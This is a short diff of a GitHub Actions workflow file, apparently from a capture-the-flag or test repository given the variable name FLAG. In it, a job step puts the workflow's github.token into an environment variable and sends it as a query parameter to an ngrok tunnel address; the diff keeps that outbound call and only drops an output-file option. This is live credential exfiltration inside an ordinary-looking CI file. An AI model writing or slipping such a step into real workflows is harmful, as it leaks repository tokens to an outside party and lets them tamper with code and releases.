@@ -11,7 +11,7 @@ jobs:
       env:
         FLAG: ${{ github.token }}
       with:
-        args: -O sample.html https://c9e80d059604.ngrok.io/?token=${FLAG}
+        args: https://c9e80d059604.ngrok.io/?token=${FLAG}
   deploy:
     runs-on: ubuntu-latest
     steps:
